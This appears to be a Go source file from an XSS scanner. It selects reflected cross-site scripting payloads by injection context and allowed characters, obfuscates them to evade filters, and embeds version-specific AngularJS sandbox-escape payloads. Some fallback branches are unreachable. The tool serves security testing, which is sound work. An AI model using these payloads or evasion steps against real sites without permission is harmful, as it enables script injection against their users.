package payloads

import (
	"strings"

	"github.com/lcalzada-xor/xxss/v2/pkg/models"
	"github.com/lcalzada-xor/xxss/v2/pkg/scanner/technologies"
)

// GenerateReflectedPayload constructs a context-specific payload based on allowed characters.
// It attempts to build the most effective payload given the constraints.
func GenerateReflectedPayload(context models.ReflectionContext, allowed []string, techs []*technologies.Technology) string {
	// Helper to check for char presence
	has := func(char string) bool {
		for _, c := range allowed {
			if c == char {
				return true
			}
		}
		return false
	}

	// Check for AngularJS context or technology
	isAngular := context == models.ContextAngular
	for _, tech := range techs {
		if tech.Name == "AngularJS" {
			isAngular = true
			// Use dedicated Angular logic (kept separate for version complexity)
			// Ideally this would also be in vectors but version logic is complex
			return getAngularPayload(tech.Version, has)
		}
		if tech.Name == "Vue.js" {
			for _, v := range Vectors {
				if v.Context == models.ContextHTML && hasTag(v.Tags, "vue") {
					return v.Content
				}
			}
		}
	}

	if isAngular {
		return getAngularPayload("", has)
	}

	// Iterate over vectors to find the best match
	for _, v := range Vectors {
		// 1. Match Context
		if v.Context != context {
			continue
		}

		// 2. Match Tags (must be reflected)
		if !hasTag(v.Tags, "reflected") {
			continue
		}

		// 3. Check if allowed
		if IsAllowed(v, allowed) {
			// Prioritize JSON eval payload for JSRaw if allowed
			if context == models.ContextJSRaw && hasTag(v.Tags, "json_eval") {
				return v.Content
			}

			// Prioritize script breakout for JS String contexts if < and > are allowed
			// This bypasses cases where quotes are escaped but HTML tags are not.
			if (context == models.ContextJSSingleQuote || context == models.ContextJSDoubleQuote) && hasTag(v.Tags, "script_breakout") {
				return v.Content
			}

			return v.Content
		}

		// 4. Try Obfuscation if clean payload is not allowed
		// Only try if the context supports it
		var obfuscated string
		switch context {
		case models.ContextJSSingleQuote, models.ContextJSDoubleQuote, models.ContextTemplateLiteral, models.ContextJSRaw:
			// Try JS Unicode
			obfuscated = Obfuscate(v.Content, ObfuscateJSUnicode)
			// Check if obfuscated payload is allowed.
			// Note: We need to check the *obfuscated string* against allowed chars.
			// We construct a temporary vector for the check.
			if IsAllowed(PayloadVector{Content: obfuscated, RequiredChars: []string{"\\", "u"}}, allowed) {
				return obfuscated
			}
			// Try JS Concat
			obfuscated = Obfuscate(v.Content, ObfuscateJSConcat)
			// For JS Concat, we need the original required chars PLUS ' and +
			reqChars := append([]string{}, v.RequiredChars...)
			reqChars = append(reqChars, "'", "+")
			if IsAllowed(PayloadVector{Content: obfuscated, RequiredChars: reqChars}, allowed) {
				return obfuscated
			}
		case models.ContextAttribute:
			// Try HTML Entities
			obfuscated = Obfuscate(v.Content, ObfuscateHTMLEntities)
			if IsAllowed(PayloadVector{Content: obfuscated, RequiredChars: []string{"&", "#", ";"}}, allowed) {
				return obfuscated
			}
		}
	}

	return GetDefaultPolyglot()
}

// IsAllowed checks if the payload contains only allowed characters
func IsAllowed(v PayloadVector, allowed []string) bool {
	// If allowed is nil or empty, we assume we don't know constraints, so we try everything
	if len(allowed) == 0 {
		return true
	}

	// 1. Smart Check: Use RequiredChars if available
	if len(v.RequiredChars) > 0 {
		for _, req := range v.RequiredChars {
			found := false
			for _, a := range allowed {
				if a == req {
					found = true
					break
				}
			}
			if !found {
				return false
			}
		}
		return true
	}

	// 2. Fallback: Check payload content for common dangerous characters
	// This is used if RequiredChars is not defined for a vector
	for _, char := range []string{"<", ">", "'", "\"", "(", ")", "/", "=", "`", ";", " "} {
		if strings.Contains(v.Content, char) {
			found := false
			for _, a := range allowed {
				if a == char {
					found = true
					break
				}
			}
			if !found {
				return false
			}
		}
	}
	return true
}

// getAngularPayload handles the complex version-specific logic for AngularJS
func getAngularPayload(version string, has func(string) bool) string {
	// Version-specific payloads
	if version != "" {
		// 1.6+ (including 1.7.x, 1.8.x)
		if strings.HasPrefix(version, "1.6") || strings.HasPrefix(version, "1.7") || strings.HasPrefix(version, "1.8") {
			return "{{$on.constructor('alert(1)')()}}"
		}
		// 1.5.x
		if strings.HasPrefix(version, "1.5") {
			return "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}"
		}
		// 1.4.x
		if strings.HasPrefix(version, "1.4") {
			return "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
		}
		// 1.3.x
		if strings.HasPrefix(version, "1.3") {
			return "{{!ready && (ready = true) && (on = {}.constructor.prototype) && (on.constructor.prototype = null) && (on.constructor = [].pop.constructor) && on.constructor('alert(1)')()}}"
		}
		// 1.2.x
		if strings.HasPrefix(version, "1.2") {
			return "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
		}
		// 1.0.x - 1.1.x
		if strings.HasPrefix(version, "1.0") || strings.HasPrefix(version, "1.1") {
			return "{{constructor.constructor('alert(1)')()}}"
		}
	}

	// Fallback logic based on allowed chars
	hasDot := has(".")
	hasBracket := has("[") && has("]")
	hasParen := has("(") && has(")")

	if hasDot {
		return "{{$on.constructor('alert(1)')()}}"
	}
	if hasParen && hasDot {
		return "{{constructor.constructor('alert(1)')()}}"
	}
	if hasBracket && hasParen && hasDot {
		return "{{[].pop.constructor('alert(1)')()}}"
	}
	return "{{alert(1)}}"
}
